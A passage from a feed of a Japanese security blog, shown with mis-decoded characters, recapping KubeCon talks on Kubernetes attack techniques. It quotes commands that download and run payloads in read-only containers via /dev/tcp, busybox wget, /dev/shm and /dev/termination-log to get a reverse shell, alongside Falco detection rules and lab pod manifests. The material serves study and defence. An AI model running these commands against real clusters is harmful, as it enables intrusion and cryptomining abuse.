#CNCJ\rhttps://cncj-security.connpass.com/event/341812/","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®æœ€æ–°å‹•å‘ï¼šè„…å¨ã¨å¯¾ç­–","link":"https://speakerdeck.com/kyohmizu/saibasekiyuriteinozui-xin-dong-xiang-xie-wei-todui-ce","contentSnippet":"ã‚»ãƒŸãƒŠãƒ¼ç™»å£‡è³‡æ–™ã§ã™ã€‚2024/05/21\rhttps://pages.securify.jp/event-seminar-20240521.html","isoDate":"2024-05-21T04:00:00.000Z","dateMiliSeconds":1716264000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®åŸºæœ¬ã¨è„…å¨ã¸ã®å¯¾ç­–","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuriteinoji-ben-toxie-wei-henodui-ce","contentSnippet":"ã€ŒOffers - ä½•ã‹ã‚‰å§‹ã‚ã‚‹ï¼Ÿè„…å¨ã‹ã‚‰è€ƒãˆã‚‹ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã€ã®ç™»å£‡è³‡æ–™ã§ã™ã€‚2024/04/16\rhttps://offers.connpass.com/event/314412/","isoDate":"2024-04-16T04:00:00.000Z","dateMiliSeconds":1713240000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"å®‰å…¨ãª Kubernetes ç’°å¢ƒã‚’ç›®æŒ‡ã—ã¦","link":"https://speakerdeck.com/kyohmizu/an-quan-na-kubernetes-huan-jing-womu-zhi-site","contentSnippet":"Kubernetes Novice Tokyo #30 ã®ç™»å£‡è³‡æ–™ã§ã™ã€‚2024/02/08\rhttps://k8s-novice-jp.connpass.com/event/300441/","isoDate":"2024-02-08T05:00:00.000Z","dateMiliSeconds":1707368400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"KubeCon NA 2023 Recap: Attacking Kubernetes ç·¨","link":"https://kyohmizu.hatenablog.com/entry/2023/12/31/040720","contentSnippet":"æœ¬è¨˜äº‹ã¯ 3-shake Advent Calendar 2023 æœ€çµ‚æ—¥ã®è¨˜äº‹ã§ã™ã€‚ã“ã‚“ã«ã¡ã¯ã€ãã‚‡ãƒ¼ (@kyohmizu) ã§ã™å°‘ã—æ—¬ã‚’é€ƒã—ã¦ã—ã¾ã„ã¾ã—ãŸãŒã€KubeCon NA 2023 ã®æŒ¯ã‚Šè¿”ã‚Šã‚’ã—ãŸã„ã¨æ€ã„ã¾ã™ã€‚ç§ã¯KubeConã«ã¯ãƒªã‚¢ãƒ«å‚åŠ ã—ã¦ãŠã‚‰ãšã€å¾Œã‹ã‚‰ã‚»ãƒƒã‚·ãƒ§ãƒ³å‹•ç”»ã‚’è¦‹ã¾ã—ãŸã€‚Kubernetes ç·¨ã€ã¨ã„ã†ã“ã¨ã§ã€Kubernetes ã¸ã®ã‚µã‚¤ãƒãƒ¼æ”»æ’ƒãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«é–¢ã™ã‚‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’3ã¤ã”ç´¹ä»‹ã—ã¾ã™ã€‚ã¡ãªã¿ã«æœ¬å†…å®¹ã¯ã€å…ˆæ—¥é–‹å‚¬ã•ã‚ŒãŸ CloudNative Days Tokyo 2023 ã«ã¦ãŠè©±ã—ã™ã‚‹ã‹æ¤œè¨ã—ã¦ã„ãŸã®ã§ã™ãŒã€æº–å‚™æœŸé–“ã¨ã‚»ãƒƒã‚·ãƒ§ãƒ³æ™‚é–“ (20åˆ†) ã®éƒ½åˆã§æ³£ãæ³£ãè«¦ã‚ãŸã‚‚ã®ã«ãªã‚Šã¾ã™ã€‚ speakerdeck.comãã‚Œã§ã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³ç´¹ä»‹ã«å…¥ã‚Šã¾ã™ã€‚K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±Kubernetes ã‚¯ãƒ©ã‚¹ã‚¿ã«ä¾µå…¥ã—ãŸæ”»æ’ƒè€…ãŒè¡Œã†æ”»æ’ƒæ‰‹æ³•ã¨ã€ãã®å¯¾ç­–ã‚’ç´¹ä»‹ã™ã‚‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§ã™ã€‚æœ€åˆã« TeamTNT ã®è¡Œã£ãŸæ”»æ’ƒã‚­ãƒ£ãƒ³ãƒšãƒ¼ãƒ³ã«ã¤ã„ã¦ã€éå»ã®èª¿æŸ»ãƒ¬ãƒãƒ¼ãƒˆã‚’ãƒ™ãƒ¼ã‚¹ã«èª¬æ˜ã—ã¦ã„ã¾ã™ã€‚ã‚¯ãƒ©ã‚¹ã‚¿ã¸ã®åˆæœŸã‚¢ã‚¯ã‚»ã‚¹ã®å¾Œã€kubelet API ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ (10250) ã‚’ç‹™ã£ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ã‚­ãƒ£ãƒ³ã‚’ã‹ã‘ã¦ã„ã¾ã™ã€‚ã‚¹ã‚­ãƒ£ãƒ³ã«ã‚ˆã£ã¦ kubelet API ã‚’ç™ºè¦‹ã—ãŸå ´åˆã€kubelet API ã«POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚Šã€æœ€çµ‚çš„ã«ãƒãƒ¼ãƒ‰å†…ã®å…¨ã‚³ãƒ³ãƒ†ãƒŠã«å¯¾ã—ã‚¯ãƒªãƒ—ãƒˆãƒã‚¤ãƒŠãƒ¼ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚è©³ç´°ã¯èª¿æŸ»ãƒ¬ãƒãƒ¼ãƒˆã‚’å‚ç…§ã„ãŸã ããŸã„ã§ã™ãŒã€æ”»æ’ƒã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã‚‹ã¨ã©ã®ã‚ˆã†ã«æ”»æ’ƒãŒè¡Œã‚ã‚Œã‚‹ã®ã‹ã‚¤ãƒ¡ãƒ¼ã‚¸ã—ã‚„ã™ã„ã¨æ€ã„ã¾ã™ã€‚ã“ã®æ”»æ’ƒã¯ã‚¢ãƒ—ãƒªã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã‚¯ãƒªãƒ—ãƒˆãƒã‚¤ãƒŠãƒ¼ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã€æ—©æœŸã«ç™ºè¦‹ã•ã‚Œã¦ã—ã¾ã†å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãã“ã§ã‚ˆã‚Šç™ºè¦‹ã•ã‚Œã«ãã„æ”»æ’ƒæ‰‹æ³•ã¨ã—ã¦ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³å¾ŒåŠã§ã¯ã€ŒSidecar Injection æ”»æ’ƒã€ã‚’å–ã‚Šä¸Šã’ã¦ã„ã¾ã™ã€‚Sidecar Injection æ”»æ’ƒ ã¯ Microsoft ã®ã€ŒThreat Matrix for Kubernetesã€ã§ç´¹ä»‹ã•ã‚Œã¦ã„ã‚‹æ”»æ’ƒãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã™ã€‚ã¡ãªã¿ã« MITRE ATT\u0026CK ã® Containers Matrix ã«ã¯ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯å«ã¾ã‚Œã¦ã„ã¾ã›ã‚“ã€‚Sidecar Injection æ”»æ’ƒã¯åå‰ã®é€šã‚Šã€Pod å†…ã®ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ã‚³ãƒ³ãƒ†ãƒŠã‚’æ¨™çš„ã¨ã—ã¾ã™ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã§æ”»æ’ƒã®ã‚µãƒ³ãƒ—ãƒ«ã‚³ãƒ¼ãƒ‰ãŒå…¬é–‹ã•ã‚Œã¦ã„ã¾ã—ãŸãŒã€Pod å†…ã®ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ã‚³ãƒ³ãƒ†ãƒŠã®ã¿ã‚’é¸æŠã—ã‚¯ãƒªãƒ—ãƒˆãƒã‚¤ãƒŠãƒ¼ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’ç›®çš„ã¨ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã—ãŸã€‚å€‹äººçš„ã«ã‚ã¾ã‚Šãƒ”ãƒ³ã¨æ¥ãªã‹ã£ãŸã®ã¯ã€ã‚¢ãƒ—ãƒªã‚³ãƒ³ãƒ†ãƒŠã§ã¯ãªãã‚µã‚¤ãƒ‰ã‚«ãƒ¼ã‚³ãƒ³ãƒ†ãƒŠã‚’ç‹™ã†ã“ã¨ã§æœ¬å½“ã«æ”»æ’ƒã‚’ç§˜åŒ¿ã§ãã‚‹ã®ã‹ï¼Ÿã¨ã„ã†ç‚¹ã§ã™ã€‚ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ã‹ã¯ã‚ã¾ã‚Šé–¢ä¿‚ãªã„æ°—ãŒã—ã¾ã™ã€‚ãã—ã¦æœ€å¾Œã«ã€ã“ã‚Œã‚‰ã®æ”»æ’ƒã«å¯¾ã™ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã«ã¤ã„ã¦èª¬æ˜ã—ã¦ã„ã¾ã™ã€‚Kubernetes ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨ã—ã¦ã€ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚¹ã‚­ãƒ£ãƒ³ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®3ã¤ã®ã‚«ãƒ†ã‚´ãƒªã‚’æŒ™ã’ã€å®Ÿè¡Œä¸­ã®ã‚³ãƒ³ãƒ†ãƒŠã«å¯¾ã™ã‚‹æ”»æ’ƒã«ã¯ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŒæœ‰åŠ¹ã§ã‚ã‚‹ã¨è¿°ã¹ã¦ã„ã¾ã™ã€‚Falco ã‚’å–ã‚Šä¸Šã’ã€ä»Šå›ã®æ”»æ’ƒã«å¯¾ã™ã‚‹ Falco ãƒ«ãƒ¼ãƒ«ã‚‚å…¬é–‹ã•ã‚Œã¾ã—ãŸã€‚- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: \u003e    spawned process and    container and    shell_procs  output: \u003e    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code \u0026 File Execution in R/O FS â€“ Am I Write?ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±readOnlyRootFilesystem: true ãŒè¨­å®šã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒŠã«ãŠã„ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã§æ”»æ’ƒã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’3ã¤ç´¹ä»‹ã—ã¦ã„ã¾ã™ã€‚Readonly Filesystem ã§ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿è¾¼ã¿ (Read) ã¨å®Ÿè¡Œ (Execute) ã¯ã§ãã‚‹ãŒæ›¸ãè¾¼ã¿ (Write) ãŒã§ããªã„ã¨ã„ã†ç‰¹å¾´ãŒã‚ã‚Šã¾ã™ã€‚ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚’é…ç½®ã—ãŸã‚Šã™ã‚‹ã“ã¨ã‚’é˜²æ­¢ã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ãƒ¬ã‚¹ãƒãƒ«ã‚¦ã‚§ã‚¢ã®æ”»æ’ƒã‚‚å­˜åœ¨ã—ã¾ã™ãŒã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã« curl ã‚„ wget ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ãŒå«ã¾ã‚Œã¦ã„ãªã‘ã‚Œã°ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã›ã‚“ã€‚ãã‚Œã§ã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³å†…ã®3ã¤ã®ã‚±ãƒ¼ã‚¹ã«ã¤ã„ã¦è¦‹ã¦ã„ãã¾ã™ã€‚ã“ã“ã§ã¯ã™ã¹ã¦ã‚’ç´¹ä»‹ã—ãã‚Œãªã„ãŸã‚ã€ã‚ˆã‚Šè©³ã—ãçŸ¥ã‚ŠãŸã„æ–¹ã¯å‹•ç”»ã‚’è¦‹ãŸã‚Šãƒ„ãƒ¼ãƒ«ã‚’èª¿ã¹ãŸã‚Šã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã‚±ãƒ¼ã‚¹1curl ã‚„ wget ã®ã‚ˆã†ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ„ãƒ¼ãƒ«ãŒãªã„å ´åˆã€ã©ã®ã‚ˆã†ã«æ”»æ’ƒã‚³ãƒ¼ãƒ‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ/dev/tcp ã‚’åˆ©ç”¨ã—ã¦ TCP ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºç«‹ã—ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ã„ã¾ã™ã€‚ãŸã ã—ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ã¯ã§ããªã„ãŸã‚ã€ãƒ¡ãƒ¢ãƒªä¸Šã§ç›´æ¥å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯ DDExec ã‚’ä½¿ã„ã€ãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã™ã‚‹ã“ã¨ã§ãƒ•ã‚¡ã‚¤ãƒ«ãƒ¬ã‚¹å®Ÿè¡Œã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚$ function __bindown () {  read proto server path \u003c\u003c\u003c$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x\"$(HOST)\" == x\"${PORT}\" ]] \u0026\u0026 PORT=8080  exec 3\u003c\u003e/dev/tcp/${HOST]/$PORT  echo -en \"GET ${(FILE) HTTP/1.0\\r\\nHost: $(HOST)\\r\\n\\r\\n\" \u003e\u00263  (while read line; do  [[ \"$line\" == $'\\r' ]] \u0026\u0026 break  done \u0026\u0026 cat) \u003c\u00263  exec 3\u003e\u0026-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash \u003c(__bindown http://192.168.88.4:8080/ddexec.sh)base64 ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ãŸæ”»æ’ƒç”¨ãƒã‚¤ãƒŠãƒªã¨ ddexec.sh ã‚’ãã‚Œãã‚Œãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€ddexec.sh ã¯ bash ã§å®Ÿè¡Œã—ã¾ã™ã€‚ã‚±ãƒ¼ã‚¹2ä»Šå›ã¯ã‚³ãƒ³ãƒ†ãƒŠã‚¤ãƒ¡ãƒ¼ã‚¸ã¨ã—ã¦ alpine ã‚’åˆ©ç”¨ã—ã¦ã„ã¾ã™ (ã‚±ãƒ¼ã‚¹1ã¯ nginx ã§ã—ãŸ)ã€‚alpine ã«ã¯ bash ãŒå­˜åœ¨ã›ãšã€/dev/tcp ã‚’ãã®ã¾ã¾å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ããªã„ãŸã‚ã€åˆ¥ã®æ–¹æ³•ã§ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã‚’è©¦ã¿ã¾ã™ã€‚curl ã‚„ wget ã¯å­˜åœ¨ã—ã¾ã›ã‚“ãŒã€alpine ã«ã¯ busybox ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã«ã¯ busybox wget ã‚’åˆ©ç”¨ã—ã€ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰å…ˆã«ã¯ Readonly RootFS ã®ä¸­ã§ã‚‚æ›¸ãè¾¼ã¿å¯èƒ½ãª tmpfs ã‚’é¸æŠã—ã¦ã„ã¾ã™ã€‚$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)ãƒã‚¤ãƒŠãƒªã‚³ãƒ¼ãƒ‰ã‚’ç›´æ¥å®Ÿè¡Œã§ãã‚‹ ddsc.sh ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€/dev/shm ã«ä¿å­˜ã—ã¾ã™ã€‚noexec ã§ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã¦ã„ã‚‹ãŸã‚ãƒ•ã‚¡ã‚¤ãƒ«ã®å®Ÿè¡Œã¯ã§ãã¾ã›ã‚“ãŒã€ddsc.sh ã¯ã‚·ã‚§ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆãªã®ã§ sh ã‹ã‚‰å®Ÿè¡Œå¯èƒ½ã§ã™ã€‚$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh \u003e $dde$ code=$(mktemp -p /dev/shm)$ echo \"6a295899...60f05\" \u003e $code$ sh $dde -x \u003c $codeã‚±ãƒ¼ã‚¹3ã‚±ãƒ¼ã‚¹2ã¨åŒã˜ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã‹ã‚‰ä½œã‚‰ã‚ŒãŸ alpine ã‚³ãƒ³ãƒ†ãƒŠã®ç’°å¢ƒã§ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã«ã¯å¼•ãç¶šã busybox ã‚’åˆ©ç”¨ã—ã¦ã„ã¾ã™ã€‚termination-log ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¿å­˜ã—ã€ãƒªãƒ³ã‚«ã‚’åˆ©ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚Kubernetes ã«ã¯ã‚³ãƒ³ãƒ†ãƒŠã®çµ‚äº†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å–å¾—ã™ã‚‹æ©Ÿèƒ½ãŒã‚ã‚Šã€å–å¾—å…ƒãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ‘ã‚¹ãŒ /dev/termination-log ã¨ãªã£ã¦ã„ã¾ã™ã€‚å…ƒã€…çµ‚äº†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ã‚’æƒ³å®šã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ãªã®ã§ã€å½“ç„¶ãªãŒã‚‰æ›¸ãè¾¼ã¿å¯èƒ½ã§ã™ã€‚ã“ã‚Œã‚’æ”»æ’ƒç”¨ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰å…ˆã«åˆ©ç”¨ã—ã¾ã™ã€‚(çµ‚äº†ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®è©³ç´°ã¯å…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ãã ã•ã„)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount ã‚³ãƒãƒ³ãƒ‰ã®çµæœã‹ã‚‰ã€termination-log ã®ãƒã‚¦ãƒ³ãƒˆã«ã¯ noexec å±æ€§ãŒã¤ã„ã¦ã„ãªã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šãƒªãƒ³ã‚«ã‚’åˆ©ç”¨ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«å®Ÿè¡ŒãŒå¯èƒ½ã¨ãªã‚Šã¾ã™ã€‚$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd ã‚³ãƒãƒ³ãƒ‰ã«ã‚ˆã‚Šã€ãƒªãƒ³ã‚«ã®ä½¿ã„æ–¹ã¯ /lib/ld-musl-x86_64.so.1 [å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹] ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚ã‚ã¨ã¯æ”»æ’ƒç”¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹ã ã‘ã§ã™ã€‚$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell \u003e /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logã‚±ãƒ¼ã‚¹1, 2ã¨åŒæ§˜ã€å®Ÿè¡Œå¾Œã«ã¯ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ãŒç¢ºç«‹ã•ã‚Œã¦ã„ã¾ã™ã€‚æ”»æ’ƒãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®èª¬æ˜ã¯ä»¥ä¸Šã¨ãªã‚Šã¾ã™ã€‚seccomp ã‚„ SELinux ã®æ´»ç”¨termination-log ã®å ´æ‰€ã®æŒ‡å®šã‚³ãƒ³ãƒ†ãƒŠå†…ã®é€šä¿¡ã‚„ãƒ—ãƒ­ã‚»ã‚¹ã®ç›£è¦–seccomp ã‚„ SELinux ã¯å¯¾ç­–ã¨ã—ã¦ã¯ä¸€èˆ¬çš„ã§ã™ãŒã€termination-log ã«ã¤ã„ã¦ã¯èã„ãŸã“ã¨ãŒãªãã€èˆˆå‘³æ·±ã„å†…å®¹ã§ã—ãŸã€‚ãŸã ã—ãƒ­ã‚°ã®å ´æ‰€ã‚’å¤‰æ›´ã§ãã¦ã‚‚ noexec ã‚’ä»˜ä¸ã™ã‚‹æ–¹æ³•ã¯è¦‹ã¤ã‘ã‚‰ã‚Œãªã‹ã£ãŸã®ã§ã€æœ‰åŠ¹ãªå¯¾ç­–ã¨è¨€ãˆã‚‹ã‹ã©ã†ã‹ã¯ã‚„ã‚„ç–‘å•ãŒæ®‹ã‚Šã¾ã—ãŸã€‚ã‚±ãƒ¼ã‚¹2ã® /dev/shm ã‚’åˆ©ç”¨ã—ãŸæ”»æ’ƒã«ã¤ã„ã¦ã¯ã€æ¤œçŸ¥ã™ã‚‹ãŸã‚ã® Falco ãƒ«ãƒ¼ãƒ«ã‚‚ä¾‹ç¤ºã•ã‚Œã¾ã—ãŸã€‚- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: \u003e    spawned_process and    (proc.exe startswith \"/dev/shm/\" or    (proc.cwd startswith \"/dev/shm/\" and proc.exe startswith \"./\" ) or    (shell_procs and proc.args startswith \"-c /dev/shm\") or    (shell_procs and proc.args startswith \"-i /dev/shm\") or    (shell_procs and proc.args startswith \"/dev/shm\") or    (proc.args contains \"/dev/shm\" or proc.cwd startswith \"/dev/shm\") or    (proc.cwd startswith \"/dev/shm/\" and proc.args startswith \"./\" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: \"File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)\"  priority: WARNINGæœ¬ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯ç™ºè¡¨è€…ãŒ6æœˆã«æŠ•ç¨¿ã—ãŸè¨˜äº‹ã‚’ã‚‚ã¨ã«ã—ã¦ã„ã‚‹ã‚ˆã†ãªã®ã§ã€ä½µã›ã¦èª­ã‚“ã§ã„ãŸã ãã¨è‰¯ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã¾ãŸè³‡æ–™ä¸­ã® Pod ã®ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã¯ãã®ã¾ã¾ apply ã™ã‚‹ã¨ã‚¨ãƒ©ãƒ¼ã«ãªã‚‹ãŸã‚ã€ã”è‡ªèº«ã§ç’°å¢ƒã‚’å†ç¾ã—ãŸã„æ–¹ã¯ä»¥ä¸‹ã‚’ã”åˆ©ç”¨ãã ã•ã„ã€‚ã‚±ãƒ¼ã‚¹1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ã‚±ãƒ¼ã‚¹2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - \"3600\"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±system:anonymous ãƒ¦ãƒ¼ã‚¶ãƒ¼ã« cluster-admin ãƒ­ãƒ¼ãƒ«ã‚’ä»˜ä¸ã—ã¦ã„ãŸå ´åˆã®æ”»æ’ƒäº‹ä¾‹ã‚’ç´¹ä»‹ã—ã¦ã„ã¾ã™ã€‚cluster-admin ã¯äº‹å‰å®šç¾©ã•ã‚ŒãŸ ClusterRole ã§ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã¾ã™ã€‚system:anonymous ã¯åŒ¿åãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã—ã¦å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã™ã€‚Kubernetes ã‚¯ãƒ©ã‚¹ã‚¿ã«å¯¾ã—ã¦èªè¨¼ãªã—ã§ã‚ã‚‰ã‚†ã‚‹ãƒªã‚½ãƒ¼ã‚¹æ“ä½œãŒã§ãã¦ã—ã¾ã„ã¾ã™ã€‚ä»Šå›ã®æ”»æ’ƒã‚·ãƒŠãƒªã‚ªã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ã€‚Kubernetes API Server ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€è¨­å®šãƒŸã‚¹ã®ã‚ã‚‹ã‚¯ãƒ©ã‚¹ã‚¿ã‚’ç™ºè¦‹DaemonSet ã¨ã—ã¦ã‚¯ãƒªãƒ—ãƒˆãƒã‚¤ãƒŠãƒ¼ (XMRig) ã‚’è¨­ç½®cluster-admin 